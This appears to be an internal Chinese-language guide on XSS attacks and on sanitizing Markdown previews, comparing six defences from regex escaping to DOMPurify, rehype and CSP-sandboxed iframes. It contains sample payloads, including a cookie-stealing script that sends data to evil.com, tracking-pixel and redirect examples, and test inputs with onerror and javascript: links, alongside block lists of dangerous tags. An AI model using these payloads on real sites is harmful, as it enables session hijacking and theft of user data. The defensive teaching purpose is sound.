# 概述
> XSS是什么？
> XSS 是一种代码注入攻击。攻击者将恶意脚本（通常是 JavaScript）注入到受信任的网站页面中，当其他用户浏览该页面时，恶意脚本在用户浏览器中执行，从而窃取数据或执行恶意操作。
## 三种主要攻击类型
### 反射型 XSS（Reflected XSS）
* 恶意脚本包含在 **URL 参数**中，服务器将其原样"反射"到响应页面
* **不持久**，需要诱骗用户点击特制链接
* 例：`https://example.com/search?q=<script>alert(1)</script>`，服务器把 `q` 的值直接拼进 HTML 返回

#### 存储型 XSS（Stored XSS）
* 恶意脚本被**存入服务器数据库**（如评论、帖子、用户名）
* **持久性**，所有访问该页面的用户都会被攻击
* 危害最大，例：在论坛评论中提交 `<script>document.location='https://evil.com/?c='+document.cookie</script>`

#### DOM 型 XSS（DOM-based XSS）
* 恶意脚本**不经过服务器**，完全在浏览器端通过 JavaScript 操作 DOM 触发
* 例：页面 JS 读取 `location.hash` 并直接写入 `innerHTML`，攻击者构造 `https://example.com/#<img src=x onerror=alert(1)>`

## 攻击能做什么
|**危害**|**说明**|
|-|-|
|**窃取 Cookie / Session**|`document.cookie` 发送到攻击者服务器，劫持用户会话|
|**键盘记录**|监听 `keydown` 事件，记录用户输入的密码、信用卡号|
|**钓鱼**|动态修改页面内容，伪造登录表单骗取凭据|
|**传播蠕虫**|自动代表受害者发帖/发消息，形成蠕虫式传播（如 Samy 蠕虫）|
|**挖矿 / DDoS**|利用受害者浏览器算力挖矿或发起分布式请求|
|**绕过同源策略**|因为脚本在目标站点域下执行，可访问该域所有数据|
|**操作页面**|重定向、篡改内容、插入广告|

## 攻击原理（核心）
浏览器**无法区分**"网站自身的合法脚本"和"攻击者注入的恶意脚本"。只要 HTML 中出现 `<script>` 或能触发 JS 的属性（`onerror`、`onclick`、`javascript:` 协议等），浏览器就会执行。

`用户输入 → 未过滤/未转义 → 拼接进 HTML → 浏览器解析执行`

## 常见注入点
1. **URL 参数**：`?name=<script>...`
2. **表单输入**：搜索框、评论框、注册表单
3. **HTTP 头**：Referer、User-Agent 被回显到页面
4. **富文本编辑器**：允许 HTML 的编辑器
5. **第三方数据**：API 返回的未转义内容
6. **文件名**：上传文件名被显示时
7. **Markdown 渲染器**：markdown文件内容具有恶意代码

## 防御措施
> ⚠️本方案以输出编码为主
### 输出编码（最核心）
在不同上下文使用不同编码规则：

|**上下文**|**编码方式**|**示例**|
|-|-|-|
|HTML 正文|HTML 实体编码|`<` → `&lt;`，`>` → `&gt;`，`"` → `&quot;`|
|HTML 属性|HTML 属性编码|所有非字母数字字符编码为 `&#xHH;`|
|JavaScript|JS 编码|`\xHH` 或 `\uHHHH`|
|URL|URL 编码|`%HH`|
|CSS|CSS 编码|`\HHHHHH`|

### 输入验证
* 白名单校验（只允许预期格式，如邮箱、数字）
* 拒绝或过滤危险字符

### CSP（Content Security Policy）
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```
* 禁止内联脚本执行
* 限制脚本只能从指定域加载
* 即使注入成功，脚本也无法执行

### HttpOnly Cookie
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
* `HttpOnly`：JS 无法读取 Cookie，防止会话劫持
* `SameSite`：防止 CSRF 配合 XSS

### 使用安全的 API
```js
// 危险 — 直接解析 HTML
element.innerHTML = userInput;
document.write(userInput);

// 安全 — 纯文本赋值
element.textContent = userInput;
```
### HTML 恶意代码净化库
* **DOMPurify**（前端）
* **sanitize-html**（Node.js）

---

# 解决方案
> 前置内容：
> markdown-reader SDK底层使用的是 [markdown-it](https://www.npmjs.com/package/markdown-it) 渲染 markdown 内容，markdown-it 解释器在处理 markdown 代码块内容时会自动将 < 转义为 &lt;，将 > 转义为 &gt;。所以 markdown 代码块中的内容不需要做太多特殊处理。
> markdown-it 对**代码块**（无论是 ``` 围栏代码块还是缩进代码块）的处理逻辑是：
> 1. 不解析内部 Markdown 语法：代码块的核心作用是展示 “原始代码”，因此 markdown-it 会忽略块内的所有 Markdown 语法（包括链接语法 [text](url)）。
> 2. 转义 HTML 特殊字符：默认会将 <、>、& 等字符转义为 HTML 实体（如 < → <），防止代码块内的 HTML 被浏览器解析。
> 
## 方案一
**使用正则匹配<和>转义成HTML实体字符&lt;和&gt;，这样预览时，HTML就不会执行恶意标签中的内容，从而起到保护作用。**

核心代码：

```js
function xssEncode(jsonStr) {
    try {
        if (jsonStr && typeof jsonStr === 'string') {
            return jsonStr.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }
        return jsonStr;
    } catch (error) {
        return jsonStr;
    }
}
```
优点：

* 代码处理逻辑简单
* 所有通过HTML标签形式的攻击都能防御

缺点：

* 预览时页面内容完全出错，不符合markdown文件预览效果
* XSS 攻击不仅依赖HTML标签，还可以通过其他方式触发，比如`javascript:`，`data:`、`vbscript:`等协议内容
* 无法阻止 Markdown 语法生成的恶意链接，比如 `点击这里领取奖励 [点我](javascript:alert('XSS-代码块外'))`格式内容

关注指数：🌟

## 方案二
**转义markdown源码内容时过滤掉代码块中的内容，只对代码块外的内容做<和>转义处理**

核心代码：

```js
function xssEncode(markdown) {
    if (!markdown || typeof markdown !== 'string') {
        return markdown;
    }

    // 代码块占位符列表
    const codeBlocks = [];

    // 保护代码块：先保护三反引号代码块，再保护单反引号代码块
    let protectedMarkdown = markdown
        // 保护三反引号代码块 ```language ... ``` (非贪婪匹配)
        .replace(/```[\s\S]*?```/g, match => {
            codeBlocks.push(match);
            return `__CODE_BLOCK_${codeBlocks.length - 1}__`;
        })
        // 保护单反引号行内代码 `code` (不跨行)
        .replace(/`[^`\n]+?`/g, match => {
            codeBlocks.push(match);
            return `__CODE_BLOCK_${codeBlocks.length - 1}__`;
        });

    // 对非代码块部分进行转义（< 和 >）
    const encoded = protectedMarkdown.replace(/</g, '&lt;').replace(/>/g, '&gt;');

    // 恢复代码块
    return encoded.replace(/__CODE_BLOCK_(\d+)__/g, (match, index) => {
        return codeBlocks[index] || match;
    });
}
```
优点：

* 代码处理逻辑简单
* 利用markdown-it解释器自身特性处理代码块中恶意代码

缺点：

* XSS 攻击不仅依赖HTML标签，还可以通过其他方式触发，比如`javascript:`，`data:`、`vbscript:`等协议内容
* 无法阻止 Markdown 语法生成的恶意链接，比如 `点击这里领取奖励 [点我](javascript:alert('XSS-代码块外'))`格式内容
* 比如下面代码块格式，可能破坏三反引号的匹配

```md
```markdown
`inline` ```javascript console.log('block'); ``` `inline`
```
关注指数：🌟

## 方案三
**iframe标签+自定义危险元素和危险属性规则**

**实现步骤：**

1. **利用iframe标签的sandbox属性加载预览内容，sandbox 会禁止所有脚本执行、表单提交、弹窗等，但 HTML/CSS 正常渲染。**
2. **自定义危险的元素标签，当循环匹配到危险的元素标签时，替换为可见的文本块，比如<script>alert("error")</script>替换为<span>"<script>alert("error")</script>"</span>内容，让危险标签元素以纯文本的方式展示在页面上**
3. **自定义危险的元素属性，当循环匹配到某个元素的危险属性时，将具有危险属性的DOM元素也转为可见的文本块展示**

核心代码：

```js
<iframe id="preview-d" class="preview-frame" sandbox="allow-same-origin"></iframe>

// ...
function renderMethodD(markdown) {
      const html = marked.parse(markdown);

      // 用 DOMParser 解析为 DOM 树
      const parser = new DOMParser();
      const doc = parser.parseFromString(
        `<!DOCTYPE html><html><body>${html}</body></html>`,
        'text/html'
      );

      // --- 第 1 步：危险标签 → 替换为可见的文本块 ---
      const dangerousTags = [
        'script', 'style', 'iframe', 'object', 'embed',
        'applet', 'noscript', 'noembed', 'base', 'form',
        // ...
      ];
      dangerousTags.forEach(tag => {
        // 注意：querySelectorAll 返回的是静态列表，需要反复查询因为 replaceWith 会改变 DOM
        let elements;
        while ((elements = doc.querySelectorAll(tag)) && elements.length > 0) {
          elements.forEach(el => {
            const container = doc.createElement('div');
            container.className = 'xss-blocked-tag';

            const label = doc.createElement('span');
            label.className = 'xss-tag-label';
            label.textContent = `<${tag}>`;
            container.appendChild(label);

            // 显示标签的完整原始内容
            const content = doc.createElement('code');
            content.className = 'xss-tag-content';
            // 对于 script/style 显示内部文本，对于 iframe 等显示属性
            if (tag === 'script' || tag === 'style') {
              content.textContent = el.textContent;
            } else {
              // 重建属性文本
              const attrs = [...el.attributes].map(a => `${a.name}="${a.value}"`).join(' ');
              content.textContent = attrs ? `<${tag} ${attrs}>` : `<${tag}>`;
              if (el.innerHTML) {
                content.textContent += el.innerHTML;
              }
            }
            container.appendChild(content);

            el.replaceWith(container);
          });
        }
      });

      // --- 第 2 步：危险属性 → 移除并转为可见文本块 ---
      const dangerousAttrPatterns = /^on/i; // 所有 on* 事件属性
      doc.querySelectorAll('*').forEach(el => {
            // 跳过 <pre><code> 内的元素（代码块）
            if (el.closest('pre')) return;
            // ...
        });

        // javascript: 协议链接
        const href = el.getAttribute('href');
        if (href && /^\s*(javascript|data|vbscript):/i.test(href)) {
            // ...
        }

        // javascript: 协议 src（但保留正常 src）
        const src = el.getAttribute('src');
        if (src && /^\s*(javascript|data):/i.test(src)) {
            // ...
        }

        // 总体和上面相似
      });

      const processedHtml = doc.body.innerHTML;

      const fullHtml = `<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
  body { font-family: -apple-system, sans-serif; padding: 16px; margin: 0; line-height: 1.6; }
  pre { background: #1e1e1e; color: #d4d4d4; padding: 16px; border-radius: 4px; overflow-x: auto; }
  code { font-family: Menlo, Consolas, monospace; font-size: 13px; }
  p > code, li > code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; }
  blockquote { border-left: 4px solid #ddd; margin: 0; padding: 8px 16px; color: #666; }
  table { border-collapse: collapse; }
  th, td { border: 1px solid #ddd; padding: 8px; }
  img { max-width: 100%; }
</style>
</head><body>${processedHtml}</body></html>`;
      return fullHtml;
    }

// 将转换后的元素添加到iframe标签展示
const frameD = document.getElementById('preview-d');
frameD.srcdoc = renderMethodD(markdown);
```
优点：

* 可自定义需要过滤的元素和属性
* 可使用文本块的方式渲染展示危险元素和属性
* markdown源码中通过HTML标签自定义的元素特性和样式也可以正常预览展示
* 利用iframe标签的沙箱机制可以禁止一些危险脚本执行。sandbox属性和xss处理有什么关系具体可见[iframe的sandbox属性详解和对xss处理有什么作用](https://ku.baidu-int.com/d/itEBkWiejuqTR6?t=mention&mt=doc&dt=doc)
* 如果对以纯文本块的方式展示危险元素和属性效果，可以自定义危险元素和危险属性样式

缺点：

* 自定义危险元素标签和危险元素属性可能导致覆盖范围不全，边界情况无法覆盖
* 这种自定义规则匹配的方式容易被各种编码/换行/大小写绕过
* 相当于实现了业界一些净化HTML元素库的一部分功能，但整体能力以及覆盖元素范围不能和其对比（相当于重复造轮子，还没有别人的轮子强）
* 无法防御 iframe 自身的漏洞，如果浏览器的 iframe 实现存在安全漏洞（历史上出现过多次），`sandbox` 可能被绕过，导致限制失效

关注指数：🌟🌟

## 方案四
**iframe标签+DOMPurify工具库**

**实现步骤：**

1. **利用iframe标签的sandbox属性加载预览内容，sandbox 会禁止所有脚本执行、表单提交、弹窗等，但 HTML/CSS 正常渲染。**
2. **利用DOMPurify工具库实现识别拦截危险元素和危险属性，并将其转为纯文本块展示（不过拦截的危险元素标签和属性需要我们自己配置）**

核心代码：

```js
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>

// ...
function rebuildTag(el) {
    var t = el.tagName.toLowerCase();
    var a = '';
    for (var i = 0; i < el.attributes.length; i++) {
    a += ' ' + el.attributes[i].name + '="' + el.attributes[i].value + '"';
    }
    var c = el.innerHTML || el.textContent || '';
    if (c) return '<' + t + a + '>' + c + '</' + t + '>';
    return '<' + t + a + '>';
}

function renderSafe(md) {
    var raw = marked.parse(md);
    DOMPurify.removeAllHooks();

    var blocked = [
    'script', 'style', 'iframe', 'object', 'embed', 'applet',
    'form', 'base', 'meta', 'link', 'noscript', 'noembed',
    'frameset', 'frame', 'title', 'xmp', 'plaintext',
    'isindex', 'bgsound', 'layer', 'svg', 'math'
    ];

    // 危险标签 -> 纯文本节点
    DOMPurify.addHook('uponSanitizeElement', function (n, d) {
    if (n.nodeType !== 1) return;
    var tag = (d.tagName || '').toLowerCase();
    if (blocked.indexOf(tag) !== -1) {
        n.replaceWith(document.createTextNode(rebuildTag(n)));
    }
    });

    // 记录原始属性 + 标记危险
    DOMPurify.addHook('uponSanitizeAttribute', function (n, d) {
    if (!d.attrName) return;
    // 首次遇到该节点时记录完整原始属性
    if (!n._xOrig) {
        var a = '';
        for (var i = 0; i < n.attributes.length; i++) {
        a += ' ' + n.attributes[i].name + '="' + n.attributes[i].value + '"';
        }
        n._xOrig = a;
        n._xTag = n.tagName.toLowerCase();
        n._xInner = n.innerHTML || '';
    }
    // 检测 on* 事件属性
    if (/^on/i.test(d.attrName)) {
        n._xDanger = true;
    }
    // 检测 javascript:/vbscript:/data: 协议
    if (d.attrName === 'href' || d.attrName === 'src' || d.attrName === 'action') {
        var v = (d.attrValue || '').replace(/[\s\x00-\x1f]/g, '');
        if (/^(javascript|vbscript|data\s*:)/i.test(v)) {
        n._xDanger = true;
        }
    }
    });

    // 有危险属性的整个标签 -> 纯文本
    DOMPurify.addHook('afterSanitizeAttributes', function (n) {
    if (n._xDanger) {
        var txt = '<' + n._xTag + n._xOrig + '>';
        if (n._xInner) txt += n._xInner + '</' + n._xTag + '>';
        n.replaceWith(document.createTextNode(txt));
    }
    });

    var dom = DOMPurify.sanitize(raw, {
    RETURN_DOM: true,
    ADD_TAGS: ['details', 'summary'],
    ADD_ATTR: ['open', 'style']
    });
    var r = dom.innerHTML;
    DOMPurify.removeAllHooks();
    return r;
}

function render() {
    var md = document.getElementById('editor').value;
    var h = renderSafe(md);
    document.getElementById('preview').srcdoc = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>' + CSS + '</style></head><body>' + h + '</body></html>';
}
```
优点：

* 利用iframe标签的沙箱机制可以禁止一些危险脚本执行。sandbox属性和xss处理有什么关系具体可见[iframe的sandbox属性详解和对xss处理有什么作用](https://ku.baidu-int.com/d/itEBkWiejuqTR6?t=mention&mt=doc&dt=doc)
* 危险元素和属性的配置规则简单，只需要在特定位置书写规则即可，其他的交由DOMPurify处理
* 危险的元素和属性使用文本块的形式渲染展示，不丢失文档内容
* markdown源码中通过HTML标签自定义的元素特性和样式也可以正常预览展示
* 如果对以纯文本块的方式展示危险元素和属性效果，可以自定义危险元素和危险属性样式

缺点：

* 定义需要拦截的危险元素标签和属性需要我们自定义的话，可能无法覆盖所有边界case
* 需要引入外部工具库，不知外部工具库是否有隐藏风险
* 无法防御 iframe 自身的漏洞，如果浏览器的 iframe 实现存在安全漏洞（历史上出现过多次），`sandbox` 可能被绕过，导致限制失效

关注指数：🌟🌟🌟🌟🌟

## 方案五
**iframe标签 + rehype AST 树变换**

**实现步骤：**

1. **利用iframe标签的sandbox属性加载预览内容，sandbox 会禁止所有脚本执行、表单提交、弹窗等，但 HTML/CSS 正常渲染。**
2. **在 Markdown→HTML 管道中间，用 unified/rehype 在语法树层面精确识别和转换危险节点，并将其转为纯文本块展示（不过拦截的危险元素标签和属性需要我们自己配置）**

核心代码：

```js
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>

// ...
import { unified } from 'unified';
import rehypeParse from 'rehype-parse';
import rehypeStringify from 'rehype-stringify';
import { visit, SKIP } from 'unist-util-visit';
import { toHtml } from 'hast-util-to-html';
import { marked } from 'marked';

// ====== 配置 ======
var BLOCKED_TAGS = new Set([
    'script', 'style', 'iframe', 'object', 'embed', 'applet',
    'form', 'base', 'meta', 'link', 'noscript', 'noembed',
    'frameset', 'frame', 'title', 'xmp', 'plaintext',
    'isindex', 'bgsound', 'layer', 'svg', 'math'
]);

var DANGEROUS_URI_ATTRS = new Set(['href', 'src', 'action', 'formaction', 'xlink:href']);
var DANGEROUS_URI_RE = /^(javascript|vbscript|data)\s*:/i;

// ====== rehype 插件：危险节点 → 纯文本 ======
function rehypeSanitizeToText() {
    return function (tree) {
    visit(tree, 'element', function (node, index, parent) {
        if (parent === null || index === null) return;

        var tag = node.tagName.toLowerCase();

        // 1) 整个标签被封禁 → 序列化为文本
        if (BLOCKED_TAGS.has(tag)) {
        var html = toHtml(node);
        parent.children[index] = { type: 'text', value: html };
        return SKIP;
        }

        // 2) 检查属性是否含 on* / javascript: 等
        var props = node.properties || {};
        var isDangerous = false;

        for (var key of Object.keys(props)) {
        var lower = key.toLowerCase();
        if (lower.startsWith('on')) {
            isDangerous = true;
            break;
        }
        if (DANGEROUS_URI_ATTRS.has(lower)) {
            var val = String(props[key] || '').replace(/[\s\x00-\x1f]/g, '');
            if (DANGEROUS_URI_RE.test(val)) {
            isDangerous = true;
            break;
            }
        }
        }

        if (isDangerous) {
        var html2 = toHtml(node);
        parent.children[index] = { type: 'text', value: html2 };
        return SKIP;
        }
    });
    };
}

// ====== 处理管线 ======
var processor = unified()
    .use(rehypeParse, { fragment: true })
    .use(rehypeSanitizeToText)
    .use(rehypeStringify);

var CSS = 'body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';

async function renderSafe(md) {
    // 1) Markdown → HTML
    var rawHtml = marked.parse(md);
    // 2) HTML → HAST → 变换 → HTML
    var result = await processor.process(rawHtml);
    return String(result);
}

var debounceTimer = null;
function scheduleRender() {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(doRender, 200);
}

async function doRender() {
    var md = document.getElementById('editor').value;
    var safeHtml = await renderSafe(md);
    var doc = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'
    + CSS + '</style></head><body>' + safeHtml + '</body></html>';
    document.getElementById('preview').srcdoc = doc;
}
```
优点：

* AST 级别操作，最精确
* 全程在纯 AST 层面操作，不依赖浏览器 DOM API，可同构运行于 Node.js 和浏览器。
* 利用iframe标签的沙箱机制可以禁止一些危险脚本执行。sandbox属性和xss处理有什么关系具体可见[iframe的sandbox属性详解和对xss处理有什么作用](https://ku.baidu-int.com/d/itEBkWiejuqTR6?t=mention&mt=doc&dt=doc)
* 如果对以纯文本块的方式展示危险元素和属性效果，可以自定义危险元素和危险属性样式

缺点：

* 定义需要拦截的危险元素标签和属性需要我们自定义的话，可能无法覆盖所有边界case
* 需要引入外部工具库，不知外部工具库是否有隐藏风险
* 实现成本较高，需要引入过多外部工具库
* 无法防御 iframe 自身的漏洞，如果浏览器的 iframe 实现存在安全漏洞（历史上出现过多次），`sandbox` 可能被绕过，导致限制失效

关注指数：🌟🌟🌟

## 方案六
**iframe标签 + CSP 限制**

> 基础版CSP：script-src 'none' -- js执行被完全阻止
> 增强版CSP：script-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none' -- js执行被完全阻止、封堵 iframe 嵌入、表单提交、base 劫持、插件加载
**实现步骤：**

1. **利用iframe标签的sandbox属性加载预览内容，sandbox 会禁止所有脚本执行、表单提交、弹窗等，但 HTML/CSS 正常渲染。**
2. **在 iframe 的 srcdoc 中通过 <meta http-equiv="Content-Security-Policy"> 设置 CSP，浏览器级别禁止一切 JS 执行。**

核心代码：

```js
<iframe id="preview-csp-on" class="preview-frame" sandbox="allow-same-origin"></iframe>

// ...
const CSP_BASIC = "script-src 'none'";
const CSP_ENHANCED = "script-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'";

// ====== Build srcdoc ======
function buildDoc(html, cspPolicy) {
    var cspTag = cspPolicy
    ? '<meta http-equiv="Content-Security-Policy" content="' + cspPolicy + '">'
    : '';
    return '<!DOCTYPE html><html><head><meta charset="UTF-8">'
    + cspTag
    + '<style>' + CSS + '</style></head><body>'
    + html + '</body></html>';
}

const compareMarkdown = '# 对比测试\n\n'
+ '正常内容：**加粗** *斜体*\n\n'
+ '<div style="color:blue;padding:8px;border:1px solid blue">蓝色 div</div>\n\n'
+ '<img src="https://qiniucloud.qishilong.space/images202501270030826.jpg" style="width:100px">\n\n'
+ '---\n\n'
+ '## 危险内容\n\n'
+ '<script>document.write("<b style=color:red>SCRIPT EXECUTED!</b>")<\/script>\n\n'
+ '<img src=x onerror="this.src=\'https://qiniucloud.qishilong.space/images202501270030826.jpg\';this.style.border=\'3px solid red\'">\n\n'
+ '<div onmouseover="this.style.background=\'red\';this.textContent=\'HACKED!\'">鼠标移入这里</div>\n\n'
+ '<a href="javascript:void(document.body.style.background=\'red\')">点击试试</a>\n\n'
+ '<button onclick="this.textContent=\'CLICKED!\'">点击按钮</button>\n';

const html = marked.parse(compareMarkdown);

// CSP ON
document.getElementById('preview-csp-on').srcdoc = buildDoc(html, CSP_ENHANCED);
```
优点：

* 利用iframe标签的沙箱机制可以禁止一些危险脚本执行。sandbox属性和xss处理有什么关系具体可见[iframe的sandbox属性详解和对xss处理有什么作用](https://ku.baidu-int.com/d/itEBkWiejuqTR6?t=mention&mt=doc&dt=doc)
* `<script>` 内联/外部 — 全部阻止
* `on*` 事件属性 — 全部阻
* `javascript:` 协议 — 全部阻止
* `eval()`、`setTimeout("code")` — 全部阻止

缺点：

* 最终展示内容不全，会丢失一些禁止执行的内容
* CSS 注入（style 标签仍然生效）
* meta refresh 跳转仍可能生效，比如：`<meta http-equiv="refresh" content="0;url=https://evil.com">` — 跳转仍可能生效
* CSP 只拦截 javascript: 协议，普通 https 链接仍可跳转。比如：<a href="[https://www.taobao.com](https://www.taobao.com)">普通恶意链接（可点击）</a>
*  图片追踪（Image Tracking Pixel），比如：<img src="[https://evil.com/track?user=123](https://evil.com/track?user=123)" width="1" height="1">，CSP 默认允许加载图片，攻击者可用 1x1 追踪像素获取用户 IP 等信息。
* 无法防御 iframe 自身的漏洞，如果浏览器的 iframe 实现存在安全漏洞（历史上出现过多次），`sandbox` 可能被绕过，导致限制失效

关注指数：🌟

# 扩展
## XSS 防御库推荐
### 前端（浏览器端）
|**库**|**语言**|**特点**|
|-|-|-|
|**DOMPurify**|JavaScript|基于 DOM API 实现，净化逻辑严谨，能抵御各种绕过技巧；支持自定义允许的标签、属性和协议；支持 SVG 和 MathML 净化，社区活跃|
|**sanitize-html**|JavaScript|白名单机制，可精细配置允许的标签/属性/CSS，适合富文本场景|
|**xss** (js-xss)|JavaScript|轻量，白名单过滤，支持自定义规则，中文社区活跃|
|**isomorphic-dompurify**|JavaScript|DOMPurify 的同构封装，同时支持 Node.js 和浏览器|
|**xss-filters**|JavaScript|Yahoo 出品，基于上下文的输出编码（非净化），适合模板插值|

### Node.js 后端
|**库**|**特点**|
|-|-|
|**sanitize-html**|同时可用于服务端，专门为 Node.js 设计的 HTML 净化库，由 ApostropheCMS 团队维护，配置灵活，适合服务端渲染场景。|
|**DOMPurify**|同时可用于服务端|
|**xss** (js-xss)|同上，前后端通用|
|**helmet**|Express 中间件，设置安全 HTTP 头（CSP、X-XSS-Protection 等），不是净化库但是必备防线|
|**express-validator**|内置 `escape()` 方法对输入做 HTML 实体编码|
|**serialize-javascript**|安全序列化 JS 对象到 HTML 中，防止 JSON 注入 XSS|





## [DOMPurify vs sanitize-html：Markdown 渲染场景对比](https://ku.baidu-int.com/d/R3DorXq4_KMFvT?t=mention&mt=doc&dt=doc)